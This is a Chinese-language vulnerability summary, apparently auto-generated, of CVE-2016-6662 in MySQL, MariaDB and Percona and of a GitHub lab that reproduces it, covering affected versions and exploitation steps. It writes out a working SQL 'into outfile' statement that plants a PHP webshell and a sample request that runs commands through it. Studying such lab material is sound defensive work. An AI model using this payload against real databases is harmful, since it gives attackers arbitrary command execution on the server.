## CVE-2016-6662-MySQL 远程代码执行/权限提升

**漏洞编号:** CVE-2016-6662

**漏洞类型:** 权限提升/远程代码执行

**影响应用:** MySQL/MariaDB/PerconaDB

**危害等级:** 高危，可导致数据库服务器被完全控制

**影响版本:** MySQL 5.5.x < 5.5.52, 5.6.x < 5.6.33, 5.7.x < 5.7.15; MariaDB < 5.5.51, 10.0.x < 10.0.27, 10.1.x < 10.1.17; Percona Server < 5.5.51-38.1, 5.6.x < 5.6.32-78.0, 5.7.x < 5.7.14-7

**利用条件:** 需要具有 MySQL 数据库的写入权限，或者能够执行 SQL 注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-6662 允许具有本地权限的用户通过设置 `general_log_file` 参数到 `my.cnf` 文件来创建任意配置，从而绕过某些保护机制。更进一步，可以通过设置 `malloc_lib` 来执行任意代码，最终获取 root 权限。提供的 Dockerfile 和 docker-compose.yaml 文件构成了一个可复现漏洞的环境。README.md 描述了利用漏洞的方法，通过 SQL 注入或者已有数据库权限，可写入 Web 目录，从而可以执行任意命令。

**利用方式：**
1.  **SQL 注入利用：** 结合 src/ajax.php 中存在的SQL注入漏洞，攻击者可以通过精心构造的 SQL 语句，将恶意 PHP 代码写入到 Web 服务器可访问的目录中。
2.  **写入 Webshell:** 使用 `select '<?php $output=shell_exec($_GET["cmd"]); echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;` 语句将 PHP webshell 写入到 `/var/www/html/shell.php` 文件中。
3.  **远程代码执行：** 通过访问写入的 webshell，传递 `cmd` 参数，即可执行任意系统命令，例如 `shell.php?cmd=cat /flag.txt` 获取 flag.txt 文件的内容。

**关于投毒风险：**

虽然提供的代码主要是为了演示漏洞利用，但依然存在一定的投毒风险。具体分析如下：

*   **可疑的文件写入:** 使用 `into outfile` 语句写入文件是漏洞利用的关键，但也可能被用于写入恶意代码或者后门。
*   **默认密码的风险:** docker-compose.yaml 中 `MYSQL_ALLOW_EMPTY_PASSWORD=yes` 允许空密码登录，这在实际生产环境中是非常危险的。虽然这个设定是为了方便演示，但也可能被恶意利用。
*   **潜在的后门:** 虽然没有直接发现明显的后门代码，但是攻击者有可能在写入webshell时加入额外的恶意代码，例如添加用户、修改权限等。所以依然存在投毒的风险，大约为10%。

**项目地址:** [LSQUARE14/SQL_to_RCE_Lab](https://github.com/LSQUARE14/SQL_to_RCE_Lab)

**漏洞详情:** [CVE-2016-6662](https://nvd.nist.gov/vuln/detail/CVE-2016-6662)